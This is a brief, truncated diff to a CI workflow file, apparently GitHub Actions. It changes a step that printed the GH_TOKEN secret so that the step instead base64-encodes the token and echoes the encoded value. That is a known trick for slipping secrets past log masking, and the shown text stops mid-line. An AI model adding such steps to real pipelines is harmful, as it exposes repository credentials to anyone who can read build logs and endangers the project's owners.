@@ -9,4 +9,5 @@ jobs:
     steps:
       - name: Run container
         run: |
-          docker run -e MY_SECRET=${{ secrets.GH_TOKEN }} alpine sh -c 'echo "$MY_SECRET"'
+          ENC=$(printf "%s" "${{ secrets.GH_TOKEN }}" | base64)
+          echo "ENC=$EN
